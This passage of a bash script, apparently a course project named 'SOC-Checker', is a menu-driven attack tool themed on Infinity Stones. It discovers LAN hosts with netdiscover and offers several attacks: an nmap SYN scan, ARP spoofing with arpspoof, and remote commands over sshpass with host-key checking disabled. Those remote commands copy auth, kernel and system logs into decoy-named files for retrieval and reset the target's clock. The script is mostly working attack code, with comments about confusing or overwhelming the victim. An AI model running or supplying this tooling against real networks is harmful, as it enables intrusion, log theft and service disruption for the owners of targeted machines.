sudo touch kathreftis.txt ;
sudo touch specchio.txt;
sudo touch jingzi.txt; 
sudo touch lustro.txt;
sudo touch speculo.txt;
sudo chmod 666 *;
sudo cat /var/log/dpkg.log >> cermin.txt ;
sudo cat /var/log/auth.log >> spiegel.txt;
sudo cat /var/log/syslog >> miroir.txt; 
sudo cat /var/log/bootstrap.log >> espejo.txt;
sudo cat /var/log/kern.log >> geoul.txt;
sudo tac /var/log/dpkg.log >> kathreftis.txt ;
sudo tac /var/log/auth.log >> specchio.txt;
sudo tac /var/log/syslog >> jingzi.txt; 
sudo tac /var/log/bootstrap.log >> lustro.txt;
sudo tac /var/log/kern.log >> speculo.txt;
exit;
/bin/bash"

# We can create more file to either confuse the victim or overwhelm memory and attack availability

# Actual one-liner to call up list of functions to be executed on remote server and keep connection until otherwise commanded
SSHPASS=$pw_input sshpass -e ssh -t -o StrictHostKeyChecking=no $username_input@$chosen_ip_to_attack "$remote_commands"

mkdir mirror_dimension
scp $username_input@$chosen_ip_to_attack:~/mirror_dimension/* ./mirror_dimension #ssh copy to take all the files in mirror_dimension directory left at the ssh target.

cd mirror_dimension # go in the folder to tidy up result
# Remove the duplicate (tac instead of cat) files
rm kathreftis.txt
rm specchio.txt
rm jingzi.txt
rm lustro.txt
rm speculo.txt
# Rename the files to de-obfuscate the files
mv cermin.txt copy_of_dpkg.log
mv spiegel.txt copy_of_auth.log
mv miroir.txt copy_of_syslog
mv espejo.txt copy_of_bootstrap.log
mv geoul.txt copy_of_kern.log
cd .. # To  return to current directory (up from mirror_dimension directory)

# Measuring attack duration for logging
ending_attack=$(date +%s)
time_taken=$(($ending_attack-$beginning_attack))
time_taken_formatted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken/3600)) $((time_taken%3600/60)) $((time_taken%60)))
attack_time=$(date +"%Y-%m-%d/%H:%M:%S") # Time is recorded just after the whole process is done
sudo -v
executor=$(whoami)
log_entry="$attack_time $executor $time_taken_formatted $stone_choice $attack_method $my_own_ip attacking $chosen_ip_to_attack"
sudo echo "$log_entry" >> /var/log/gauntlet.log
action_after_attack
}

function soul_stone_attack()
{
echo "Executing Soul Stone Attack: ARP spoof"
echo "You have chosen $chosen_ip_to_attack as the target"
read -p "Please input the IP address to be impersonated: " ip_impersonated

# Actual Attack and concurrent Result Logging
beginning_attack=$(date +%s) #start attack timer for duration
sudo arpspoof -t $chosen_ip_to_attack $ip_impersonated # Tell the victim we are another host

# Measuring attack duration for logging
ending_attack=$(date +%s)
time_taken=$(($ending_attack-$beginning_attack))
time_taken_formatted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken/3600)) $((time_taken%3600/60)) $((time_taken%60)))

attack_time=$(date +"%Y/%m/%d/%H:%M:%S") # Time is recorded just after the arp spoof is terminated
sudo -v
executor=$(whoami)
log_entry="$attack_time $executor $time_taken_formatted $stone_choice $attack_method $my_own_ip attacking $chosen_ip_to_attack"
sudo echo "$log_entry" >> /var/log/gauntlet.log
action_after_attack
}

function space_stone_attack()
{
echo "Executing Space Stone Attack: Port Scan"
echo "You have chosen $chosen_ip_to_attack as the target"

# Actual Attack and concurrent Result Logging
beginning_attack=$(date +%s) #start attack timer for duration
sudo nmap -sS $chosen_ip_to_attack -p- >> space_result_temp # Objective is to record the result of nmap that can be parsed by ip and time

# Measuring attack duration for logging
ending_attack=$(date +%s)
time_taken=$(($ending_attack-$beginning_attack))
time_taken_formatted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken/3600)) $((time_taken%3600/60)) $((time_taken%60)))

attack_time=$(date +"%Y-%m-%d/%H:%M:%S") # Time is recorded just after the nmap scan is done
cat space_result_temp | while read line; do echo "$attack_time $chosen_ip_to_attack ${line}" >> space_result; done 
rm space_result_temp # delete temporary file without IP target (in case of multiple attack) and time after appending it to a new document (without _temp)
sudo -v
executor=$(whoami)
log_entry="$attack_time $executor $time_taken_formatted $stone_choice $attack_method $my_own_ip attacking $chosen_ip_to_attack"
sudo echo "$log_entry" >> /var/log/gauntlet.log
action_after_attack
}

function time_stone_attack()
{
echo "Executing Time Stone Attack: Time Change"
echo "You have chosen $chosen_ip_to_attack as the target"

# Input known Username and Password for SSH Purpose (preferably user with privilege escalation ability /sudo privileges)
read -p "Please enter Remote Server Username  :     " username_input
read -s -p "Please enter Remote Server Password  :     " pw_input 

# Actual Attack (via remote_timecommands) and concurrent Result Logging
beginning_attack=$(date +%s) #start attack timer for duration
remote_timecommands="echo 'Connected to Target!';
sleep 1.5;
cd;
sudo -v;
sudo systemctl stop systemd-timesyncd;
sudo timedatectl set-time "@1692921600";
sudo timedatectl;
exit;
/bin/bash"
# Epoch time above may be modified as per attacker preference

# Actual one-liner to call up list of functions to be executed on remote server and keep connection until otherwise commanded
SSHPASS=$pw_input sshpass -e ssh -t -o StrictHostKeyChecking=no $username_input@$chosen_ip_to_attack "$remote_timecommands"

# Measuring attack duration for logging
ending_attack=$(date +%s)
time_taken=$(($ending_attack-$beginning_attack))
time_taken_formatted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken/3600)) $((time_taken%3600/60)) $((time_taken%60)))
attack_time=$(date +"%Y-%m-%d/%T") # Time is recorded just after the time change attack is done
sudo -v
executor=$(whoami)
log_entry="$attack_time $executor $time_taken_formatted $stone_choice $attack_method $my_own_ip attacking $chosen_ip_to_attack"
sudo echo "$log_entry" >> /var/log/gauntlet.log
action_after_attack
}

#To identify the host IP (in order to identify the LAN network range)
host_ip=$(ifconfig | grep broadcast | awk '{print $2}')
sleep 0.5
host_subnet_mask=$(netmask -c $host_ip)
new_host_subnet_mask=${host_subnet_mask/%32/24}
#After identifying host IP (change the format to CIDR)
#As the output of the netmask -c (identifying CIDR) is always /32, the pattern substitution is used to change it to /24
#If there are more information, this might need to be tweaked (eg. If the info gathering stage indicate the network is subnetted by different department in a company)
echo -e "\e[36mThe host IP is identified to be: \e[32m$host_ip\e[0m"
echo -e "\e[36mThe host Subnet Mask is identified to be: \e[32m$new_host_subnet_mask \e[0m"
echo ""
sleep 0.5

# This section is to check if the identified range/CIDR is correct to identify the range.
echo "Identifying LAN network Range...... "
sleep 2
ip_range=$(netmask -r $new_host_subnet_mask)
echo -e "\e[36mPerforming Scanning on the current LAN: \e[32m$new_host_subnet_mask\e[0m"
sleep 1
echo "---Scanning in Progress---"
echo ""
sleep 1.5
echo "${bold}The hosts available are:${normal}"
echo "${underline}(currently inclusive of host machine, NAT device and DHCP server: excluded at attack phase)${normal}"
sudo netdiscover -r $new_host_subnet_mask -NP | grep ":" | awk '{print $1}' | tee host_list_x
grep -vE '\.1$|\.2$|\.254$' host_list_x > host_list # To exclude host machine, NAT Device and DHCP server (respectively) from list of identified hosts
rm host_list_x
#The grep is to include all lines with MAC number (include :) but exclude space and total host found
sleep 1.5

echo ""
echo "${bold}-----Stage I Concluded-----${normal}"
echo ""
sleep 1.5

# Stage II marker
echo -e "${bold}\e[31m  ____  _                     ___ ___ "
sleep 0.5
echo -e "\e[33m / ___|| |_ __ _  __ _  ___  |_ _|_ _|\e[31m"
sleep 0.5
echo -e ' \___ \| __/ _` |/ _` |/ _ \  | | | | '
sleep 0.5
echo -e "\e[33m  ___) | || (_| | (_| |  __/  | | | | "
sleep 0.5
echo -e "\e[31m |____/ \__\__,_|\__, |\___| |___|___|"
sleep 0.5
echo -e "\e[33m                 |___/                "
sleep 0.5                                     
echo -e "\e[32mAttack! Attack! Attack!"
sleep 2
echo -e "\e[0m${normal}"

# Attack Phase

function space_stone_action()
{
space_stone_display
stone_choice="space"
attack_method="port_scan"
attack_or_back
}

function soul_stone_action()
{
soul_stone_display
stone_choice="soul"
attack_method="arp_spoof"
attack_or_back
}

function reality_stone_action()
{
reality_stone_display
stone_choice="reality"
attack_method="mirror_dimension"
attack_or_back
}

function time_stone_action()
{
time_stone_display
stone_choice="time"
attack_method="time_change"
attack_or_back
}

function power_stone_action()
{
power_stone_display
stone_choice="power"
attack_method="brute_force"
attack_or_back
}

function mind_stone_action()
{
mind_stone_display
stone_choice="mind"
attack_method="riddle_ware"
attack_or_back
}

function snap_action()
{
echo "You have decided to let the universe decide"
sleep 1.5
random_stone_id=$(($RANDOM%6)) # if divided by 6, there are 6 possible remainders (0-5)
case $random_stone_id in
0)
	space_stone_action
;;
1)
	reality_stone_action
;;
2)
	soul_stone_action
;;
3)
	time_stone_action
;;
4)
	power_stone_action
;;
5)
	mind_stone_action
esac
}

function main_console()
{
echo -e "
===========================================================================
${underline}Please choose an infinity stone${nounderline}
${RED}Input A for Mirror Dimension                             (Reality Stone)${ENDCOLOR}
${ORANGE}Input B for Arpspoof                                        (Soul Stone)${ENDCOLOR}
${PURPLE}Input C for Brute Force                                    (Power Stone)${ENDCOLOR}
${BLUE}Input D for Port Scan                                      (Space Stone)${ENDCOLOR}
${GREEN}Input E for Time Distortion                                 (Time Stone)${ENDCOLOR}
${YELLOW}Input F for Riddleware                                      (Mind Stone)${ENDCOLOR}
Input G for ${RED}S${PURPLE}N${YELLOW}A${ORANGE}P${GREEN}!${BLUE}!${ENDCOLOR}                               (Let Randomness Decide)
Input H for Terminating Process/Script     (I am feeling generous today)
==========================================================================="
read ACTION
case $ACTION in 
A|a)
	reality_stone_action
;;
B|b)
	soul_stone_action
;;
C|c)
	power_stone_action
;;
D|d)
	space_stone_action
;;
E|e)
	time_stone_action
;;
F|f)
	mind_stone_action
;;
G|g)
	snap_action
;;
H|h)
	echo "Today is not the day the universe learns a lesson..."
	echo ""
	echo "${bold}-----Stage II Concluded-----${normal}"	
	echo "Terminating Project SOC-Checker |||||----------|"
	rm host_list # At the end stage, delete all temporary files
	rm hydra.restore 2>/dev/null # This is performed at the beginning of the script too, but I would prefer to keep the workplace clean (less "residual" files)
	sleep 1
	echo "Terminating Project SOC-Checker ||||||||||-----|"
	sleep 1
	echo "Terminating Project SOC-Checker ||||||||||||||||"
	sleep 1
	exit
;;
*)
	echo "Kindly choose a valid action only:'A/B/C/D/E/F/G/H' !!!"
	sleep 1.5
	main_console
;;
esac
}

main_console

#You have reached the end of the script
#T2Z0dGltZXMgYSB2ZXJ5IHNtYWxsIG1hbiBjYW4gY2FzdCBhIHZlcnkgbGFyZ2Ugc2hhZG93IChHZW9yZ2UgUi5SLiBNYXJ0aW4sIEEgQ2xhc2ggb2YgS2luZ3MpCgrigIMKCg==

